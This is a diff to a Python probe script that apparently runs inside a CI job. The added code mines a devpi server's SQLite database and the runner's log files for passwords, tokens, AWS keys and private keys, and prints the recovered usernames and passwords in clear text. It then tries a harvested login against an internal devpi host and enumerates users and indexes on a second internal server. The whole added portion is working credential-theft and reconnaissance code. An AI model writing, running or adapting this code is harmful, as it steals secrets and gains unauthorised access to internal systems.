@@ -61,7 +61,7 @@ def has_room(need=3000):
 
 def scan_lines(label, text):
     for line in text.splitlines():
-        if PAT.search(line):
+        if PAT.search(line.encode("utf-8", "replace")):
             low = line.lower()
             if any(x in low for x in SKIP_LINE):
                 continue
@@ -152,6 +152,24 @@ def ng_get(url, timeout=12, maxbytes=400000):
         return "ERR", str(e)[:160].encode()
 
 
+def ng_post_json(url, obj, timeout=12):
+    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+    data = json.dumps(obj).encode()
+    r = urllib.request.Request(url, data=data, method="POST",
+                               headers={"User-Agent": "i8034-probe",
+                                        "Content-Type": "application/json"})
+    try:
+        x = op.open(r, timeout=timeout)
+        return x.status, x.read(20000)
+    except urllib.error.HTTPError as e:
+        try:
+            return e.code, e.read(20000)
+        except Exception:
+            return e.code, b""
+    except Exception as e:
+        return "ERR", str(e)[:160].encode()
+
+
 LINK_RE = re.compile(r'<a href="([^"]+)">([^<]*)</a>([^<]*)', re.I)
 
 
@@ -218,7 +236,7 @@ def nginx_crawl(seed, depth, tag, page_budget, dl_budget, deadline):
                         lab = f"nginx:{full}"
                         emit(f"    <<<NGINXFILE {full} size={len(b)}>>>")
                         txt = b.decode("utf-8", "replace")
-                        if ext in FULL_DUMP_EXT or len(b) <= 24000:
+                        if (ext in FULL_DUMP_EXT and len(b) <= 40000) or len(b) <= 8000:
                             for line in txt.splitlines():
                                 if len(line) > 1800:
                                     line = line[:1800] + " ...[longline]"
@@ -315,10 +333,131 @@ def devpi_sqlite(path):
             pass
 
 
+def devpi_deep(path):
+    emit(f"### DEVPI-DEEP {path}")
+    try:
+        con = sqlite3.connect("file:%s?mode=ro&immutable=1" % path, uri=True, timeout=8)
+    except Exception as e:
+        emit(f"[deep] open error {e}")
+        return
+    cur = con.cursor()
+    tstart = time.monotonic()
+
+    def guard():
+        return 1 if time.monotonic() - tstart > 55 else 0
+
+    try:
+        con.set_progress_handler(guard, 200000)
+        cur.execute("SELECT keyname, COUNT(*) FROM kv GROUP BY keyname LIMIT 60")
+        for kn, c in cur.fetchall():
+            emit(f"[deep] keyname {kn!r} count={c}")
+    except Exception as e:
+        emit(f"[deep] keyname group err {str(e)[:150]}")
+
+    pairs = []
+    URLPAIR = re.compile(rb"https?://([^:/@\s]{1,64}):([^@/\s]{1,128})@([A-Za-z0-9.\-]+)")
+    cfgs = []
+    try:
+        tstart = time.monotonic()
+        con.set_progress_handler(guard, 200000)
+        cur.execute("SELECT key, keyname, serial FROM kv WHERE keyname IN ('USER','INDEX') LIMIT 400")
+        rows = cur.fetchall()
+        emit(f"[deep] USER+INDEX config rows={len(rows)}")
+        for k, kn, ser in rows:
+            emit(f"[deep] CFGKEY {kn} {k!r} serial={ser}")
+            cfgs.append((kn, k, ser))
+    except Exception as e:
+        emit(f"[deep] config-key scan err {str(e)[:150]}")
+
+    for kn, k, ser in cfgs[:120]:
+        if not has_room(20000):
+            break
+        try:
+            tstart = time.monotonic()
+            con.set_progress_handler(guard, 200000)
+            cur.execute("SELECT data FROM changelog WHERE serial=?", (ser,))
+            r = cur.fetchone()
+            if not r:
+                emit(f"[deep] CFG {k} serial={ser} MISSING")
+                continue
+            b = r[0]
+            if not isinstance(b, (bytes, bytearray)):
+                b = str(b).encode()
+            b64 = base64.b64encode(bytes(b)).decode()
+            emit(f"[deep] CFG {kn} {k} serial={ser} len={len(b)} b64={b64[:20000]}")
+            for m in URLPAIR.finditer(bytes(b)):
+                pair = (m.group(1).decode("utf-8", "replace"),
+                        m.group(2).decode("utf-8", "replace"),
+                        m.group(3).decode("utf-8", "replace"))
+                if pair not in pairs:
+                    pairs.append(pair)
+        except Exception as e:
+            emit(f"[deep] CFG {k} err {str(e)[:120]}")
+
+    # changelog full-text sweep for credential-shaped records (single bounded pass by serial range)
+    pats = [b"mirror_url", b"password", b"pwhash", b"token", b"AKIA", b"BEGIN ", b"auth"]
+    try:
+        con.set_progress_handler(None, 0)
+        cur.execute("SELECT MAX(serial) FROM changelog")
+        mx = cur.fetchone()[0] or 0
+        emit(f"[deep] changelog max_serial={mx}")
+        found = 0
+        scanned = 0
+        lo = 0
+        tsweep = time.monotonic()
+        while lo <= mx and found < 80 and time.monotonic() - tsweep < 120 and has_room(80000):
+            hi = lo + 4000
+            con.set_progress_handler(guard, 400000)
+            tstart = time.monotonic()
+            cur.execute("SELECT serial, data FROM changelog WHERE serial>=? AND serial<?", (lo, hi))
+            rows = cur.fetchall()
+            for ser, data in rows:
+                scanned += 1
+                if not isinstance(data, (bytes, bytearray)):
+                    continue
+                if any(p in data for p in pats):
+                    found += 1
+                    b64 = base64.b64encode(bytes(data)).decode()
+                    emit(f"[deep] CHG serial={ser} len={len(data)} b64={b64[:12000]}")
+                    for m in URLPAIR.finditer(bytes(data)):
+                        pair = (m.group(1).decode("utf-8", "replace"),
+                                m.group(2).decode("utf-8", "replace"),
+                                m.group(3).decode("utf-8", "replace"))
+                        if pair not in pairs:
+                            pairs.append(pair)
+                    if found >= 80:
+                        break
+            lo = hi
+        emit(f"[deep] sweep scanned={scanned} found={found} elapsed={int(time.monotonic()-tsweep)}s")
+    except Exception as e:
+        emit(f"[deep] sweep err {str(e)[:150]}")
+    emit(f"[deep] URL user:pass pairs found={len(pairs)}")
+    for u, pw, h in pairs[:20]:
+        emit(f"[deep] PAIR host={h} user={u} pass_len={len(pw)} pass={pw}")
+    cand = None
+    for u, pw, h in pairs:
+        hl = h.lower()
+        if ("devpi" in hl or "sourcefind" in hl or hl.startswith("10.") or
+                hl.startswith("12.12.") or hl.startswith("192.168.")):
+            cand = (u, pw, h)
+            break
+    if cand:
+        emit(f"[deep] AUTH-TEST one bounded devpi login as user={cand[0]} (host hint {cand[2]})")
+        st, b = ng_post_json("http://10.16.1.201:9929/+login",
+                             {"user": cand[0], "password": cand[1]}, timeout=15)
+        emit(f"[deep] AUTH-TEST /+login -> {st} {b[:800].decode('utf-8','replace')}")
+    else:
+        emit("[deep] AUTH-TEST skipped (no internal/devpi credential pair recovered)")
+    try:
+        con.close()
+    except Exception:
+        pass
+
+
 def main():
     import subprocess
     host = socket.gethostname()
-    emit(f"===I8034-BEGIN {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} "
+    emit(f"===I8034-BEGIN v2 {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} "
          f"host={host} job={os.environ.get('GITHUB_JOB','?')} run={os.environ.get('GITHUB_RUN_ID','?')}===")
     try:
         emit("--- id: " + subprocess.run(["id"], capture_output=True, text=True, timeout=10).stdout.strip())
@@ -378,6 +517,7 @@ def main():
                   "/public/devpi_config/devp/.nodeinfo"):
             show_file(p, 20000)
         devpi_sqlite("/public/devpi_config/devpi/.sqlite")
+        devpi_deep("/public/devpi_config/devpi/.sqlite")
     except Exception:
         emit("[devpi_config] EXC " + traceback.format_exc()[-500:])
 
@@ -397,13 +537,38 @@ def main():
                            ("site-packages", "node_modules", ".git", "__pycache__")]
                 for fn in sorted(files):
                     low = fn.lower()
-                    if ("harbor-login" in low or low in ("harbor.sh", "harbor_env.sh",
-                                                         ".env", ".envrc") or
-                            ("harbor" in low and low.endswith((".sh", ".env", ".conf", ".json", ".yaml", ".yml")))):
-                        fp = os.path.join(root, fn)
-                        if fp not in seen:
-                            seen.add(fp)
-                            show_file(fp, 80000)
+                    fp = os.path.join(root, fn)
+                    if fp in seen:
+                        continue
+                    try:
+                        fsz = os.path.getsize(fp)
+                    except OSError:
+                        continue
+                    rel = root.replace(os.sep, "/")
+                    interesting = ("harbor" in low or low in (".env", ".envrc", "launch.json",
+                                   "setup.json", "pre-gpu.txt", "image-inspect.json",
+                                   "manifest.json", "resolved-config.py") or
+                                   ("hub/scripts" in rel and low.endswith((".sh", ".env", ".conf",
+                                    ".cfg", ".ini", ".json", ".yaml", ".yml", ".txt", ".py"))))
+                    if interesting and fsz <= 200000:
+                        seen.add(fp)
+                        show_file(fp, 80000)
+                    elif low in ("runner.log", "console.log", "preflight.log") and fsz <= 30000000:
+                        seen.add(fp)
+                        try:
+                            with open(fp, "rb") as f:
+                                b = f.read(200000)
+                            txt = b.decode("utf-8", "replace")
+                            hits = [ln for ln in txt.splitlines()
+                                    if re.search(r"harbor|docker login|password|passwd|token|"
+                                                 r"AKIA|BEGIN [A-Z ]*PRIVATE|auths|secret|"
+                                                 r"register|credential", ln, re.I)]
+                            emit(f"### LOGSCAN {fp} size={fsz} head={len(b)} hits={len(hits)}")
+                            for ln in hits[:120]:
+                                emit("  " + ln[:400])
+                            scan_lines("logscan:" + fp, "\n".join(hits))
+                        except Exception as e:
+                            emit(f"[GT] logscan err {fp} {e}")
                 if not has_room():
                     break
             emit(f"== harbor-login files read={len(seen)}")
@@ -450,6 +615,21 @@ def main():
                 if not emit("  " + line[:400]):
                     break
             scan_lines("altdevpi:" + path, txt)
+        st, b = ng_get("http://12.12.12.201:9929/", timeout=10, maxbytes=200000)
+        if st == 200:
+            html = b.decode("utf-8", "replace")
+            links = sorted(set(re.findall(r'href="(?:http://12\.12\.12\.201:9929)?(/[^"#?]+)"', html)))
+            idx = [p for p in links if re.match(r"^/[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+/?$", p)]
+            usr = [p for p in links if re.match(r"^/[A-Za-z0-9_.\-]+/?$", p)]
+            emit(f"== altdevpi users={usr[:40]}")
+            emit(f"== altdevpi indexes={idx[:80]}")
+            for p in idx[:6]:
+                st2, b2 = ng_get("http://12.12.12.201:9929" + p.rstrip("/") + "/",
+                                 timeout=10, maxbytes=20000)
+                emit(f"== altdevpi index {p} -> {st2} {b2[:600].decode('utf-8','replace').replace(chr(10),' ')}")
+        for path in ("/+api",):
+            st, b = ng_get("http://12.12.12.201:9929" + path, timeout=10, maxbytes=60000)
+            emit(f"== altdevpi {path} -> {st} {b[:1500].decode('utf-8','replace')}")
         for path in ("/12.12.12.201/", "/"):
             st, b = ng_get("http://12.12.12.201:8000" + path, timeout=6, maxbytes=20000)
             emit(f"== alt8000 {path} -> {st} {b[:200].decode('utf-8','replace')}")
